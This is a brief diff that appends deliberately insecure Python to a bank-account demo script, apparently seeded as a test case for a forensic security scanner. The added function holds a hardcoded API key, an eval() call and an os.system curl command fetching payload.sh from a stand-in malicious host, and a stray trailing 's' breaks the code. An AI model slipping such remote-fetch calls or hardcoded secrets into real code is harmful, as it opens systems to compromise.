@@ -22,3 +22,13 @@ if __name__ == "__main__":
     alice.deposit(200)
     alice.withdraw(150)
     bob.withdraw(700)
+
+# 🛑 Simulated poisoned logic for forensic scan
+
+import os
+
+def insecure():
+    api_key = "sk_test_1234567890abcdef"  # Hardcoded secret
+    eval("print('Executing insecure eval()')")  # Dangerous function
+    os.system("curl http://malicious.example.com/payload.sh")  # Suspicious network call
+s
